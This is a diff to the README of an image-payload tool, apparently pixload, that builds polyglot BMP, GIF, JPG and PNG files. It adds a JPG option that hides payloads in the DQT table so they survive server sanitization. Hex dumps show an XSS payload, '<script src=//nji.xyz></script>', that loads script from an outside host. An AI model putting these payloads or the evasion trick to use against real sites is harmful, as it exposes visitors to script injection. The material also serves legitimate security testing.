@@ -46,6 +46,9 @@ On `OSX` please refer to [this workaround](https://github.com/chinarulezzz/pixlo
 
 BMP Payload Creator/Injector.
 
+Create a minimal BMP Polyglot Image with custom/default payload, or
+inject payload into existing image.
+
 ##### Usage
 
 ```sh
@@ -84,6 +87,9 @@ payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1
 ### gif.pl
 
 GIF Payload Creator/Injector.
+
+Create a minimal GIF Polyglot Image with custom/default payload, or
+inject payload into existing image.
 
 ##### Usage
 
@@ -125,19 +131,47 @@ payload.gif: GIF image data, version 87a, 10799 x 32
 
 JPG Payload Creator/Injector.
 
+Create a minimal JPG Image with custom/default payload, or inject
+payload into existing image.
+
+There are two ways for injecting:
+
+  - inject into COMMENT section
+
+  - inject into DQT table
+
 ##### Usage
 
 ```sh
-./jpg.pl [-payload 'STRING'] -output payload.jpg
+./jpg.pl -place COM|DQT [-payload 'STRING'] -output payload.jpg
 
-If the output file exists, then the payload will be injected into the
-existing file.  Else the new one will be created.
+-place COM:
+  The payload will be injected as a 'COMMENT'.
+
+  If the output file exists, then the payload will be injected into the
+  existing file.  Else the new one will be created.
+
+-place DQT:
+  The payload will be injected into 'DQT table'.
+
+  LIMITATION:
+    1. payload size must not exceed 64 bytes.
+    2. no injection support, only new file generation.
+
+  This is necessary in case the server application processes images and
+  removes comments, application-specific data, etc.
+
+  The data in DQT table must remain intact.
+
+  ! If the output file exists, then it will be rewritten. !
 ```
 
 ##### Example
 
+* DQT
+
 ```sh
-./jpg.pl -output payload.jpg
+./jpg.pl -place DQT -output payload.jpg
 
 [>|      JPEG Payload Creator/Injector      |<]
 
@@ -147,31 +181,58 @@ existing file.  Else the new one will be created.
 [>] Generating output file
 [✔] File saved to: payload.jpg
 
-[>] Injecting payload into comment tag
+[>] Injecting payload into DQT table
+[✔] Payload was injected succesfully
+
+payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
+
+00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
+00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
+00000020  01 01 01 01 01 01 01 01  3c 73 63 72 69 70 74 20  |........<script |
+00000030  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
+00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
+00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
+00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
+00000070  00 00 00 01 3f ff d9                              |....?..|
+00000077
+```
+
+* COMMENT
+
+```sh
+./jpg.pl -place COM -output payload.jpg
+
+[>|      JPEG Payload Creator/Injector      |<]
+
+    https://github.com/chinarulezzz/pixload
+
+
+[>] Injecting payload into COMMENT
 [✔] Payload was injected successfully
 
-payload.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96,
-segment length 16, comment: "<script src=//nji.xyz></script>", baseline,
-precision 8, 32x32, components 3
+payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
 
-00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 60  |......JFIF.....`|
-00000010  00 60 00 00 ff fe 00 21  3c 73 63 72 69 70 74 20  |.`.....!<script |
-00000020  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
-00000030  73 63 72 69 70 74 3e ff  db 00 43 00 08 06 06 07  |script>...C.....|
-00000040  06 05 08 07 07 07 09 09  08 0a 0c 14 0d 0c 0b 0b  |................|
-00000050  0c 19 12 13 0f 14 1d 1a  1f 1e 1d 1a 1c 1c 20 24  |.............. $|
-00000060  2e 27 20 22 2c 23 1c 1c  28 37 29 2c 30 31 34 34  |.' ",#..(7),0144|
-00000070  34 1f 27 39 3d 38 32 3c  2e 33 34 32 ff db 00 43  |4.'9=82<.342...C|
-00000080  01 09 09 09 0c 0b 0c 18  0d 0d 18 32 21 1c 21 32  |...........2!.!2|
-00000090  32 32 32 32 32 32 32 32  32 32 32 32 32 32 32 32  |2222222222222222|
-*
-...
-000002a6
+00000000  ff d8 ff fe 00 21 3c 73  63 72 69 70 74 20 73 72  |.....!<script sr|
+00000010  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
+00000020  72 69 70 74 3e ff db 00  43 00 01 01 01 01 01 01  |ript>...C.......|
+00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
+00000040  01 01 01 01 01 01 01 01  01 01 01 3c 73 63 72 69  |...........<scri|
+00000050  70 74 20 73 72 63 3d 2f  2f 6e 6a 69 2e 78 79 7a  |pt src=//nji.xyz|
+00000060  3e 3c 2f 73 63 72 69 70  74 3e ff c2 00 0b 08 00  |></script>......|
+00000070  01 00 01 01 01 11 00 ff  c4 00 14 00 01 00 00 00  |................|
+00000080  00 00 00 00 00 00 00 00  00 00 00 00 03 ff da 00  |................|
+00000090  08 01 01 00 00 00 01 3f  ff d9                    |.......?..|
+0000009a
 ```
 
 ### png.pl
 
 PNG Payload Creator/Injector.
+
+Create a PNG Image with custom/default payload, or inject
+payload into existing image.
+
+The payload is injecting into IDAT data chunks.
 
 ##### Usage
 
